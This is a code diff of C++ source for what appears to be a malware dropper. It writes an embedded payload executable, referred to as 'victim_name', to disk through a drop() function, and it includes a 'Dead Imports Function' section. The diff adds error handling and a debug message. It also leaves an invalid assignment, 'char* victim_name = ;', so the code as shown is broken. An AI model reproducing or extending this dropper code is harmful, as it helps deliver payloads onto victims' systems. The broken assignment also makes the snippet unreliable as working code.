@@ -45,7 +45,8 @@ void set_name();
 // global: final binary name
 char name[10 * NAME_SIZE];
 
-char* victim_name;
+// (char*) C:\\example\\path\\to\\your\\payload.exe
+char* victim_name = ; 
 
 bool use_base64;
 
@@ -57,6 +58,7 @@ int main(int argc, char* argv[])
 {
 	// string
 
+	std::cout << "This is a problem." << std::endl;
 	std::cout << "argc: " << argc << std::endl;
 
 	// Handle to myself
@@ -109,7 +111,6 @@ void set_name()
 		}
 	}
 #else
-	victim_name = (char*) "";
 	strcpy_s(name, sizeof(name), victim_name);
 #endif
 }
@@ -171,17 +172,21 @@ void drop(int size, void* buffer)
 {
 	FILE* f = fopen(name, "ab");
 	// traverse byte list
-
-	for (int i = 0;i < size;i++)
-	{
-		// byte pointer
-		unsigned char c1 = ((char*)buffer)[i];
-		// drop byte to file
-		fprintf(f, "%c", c1);
+	if (!f) {
+		std::cerr << "Dropping failed due to file error." << std::endl;
 	}
+	else {
+		for (int i = 0;i < size;i++)
+		{
+			// byte pointer
+			unsigned char c1 = ((char*)buffer)[i];
+			// drop byte to file
+			fprintf(f, "%c", c1);
+		}
 
-	// file fully written
-	fclose(f);
+		// file fully written
+		fclose(f);
+	}
 }
 
 // Dead Imports Function
